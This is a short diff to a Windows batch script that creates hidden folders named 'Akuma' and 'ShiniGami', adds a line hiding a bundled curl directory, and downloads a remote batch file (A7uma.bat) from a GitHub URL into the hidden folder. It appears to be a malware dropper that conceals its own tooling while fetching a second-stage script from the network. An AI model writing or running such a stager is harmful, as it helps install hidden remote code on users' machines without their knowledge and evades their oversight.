@@ -1,6 +1,7 @@
 @echo off
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
+attrib +h %homedrive%\curl
 mkdir %homedrive%\ShiniGami
 attrib +h %homedrive%\ShiniGami
 %homedrive%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
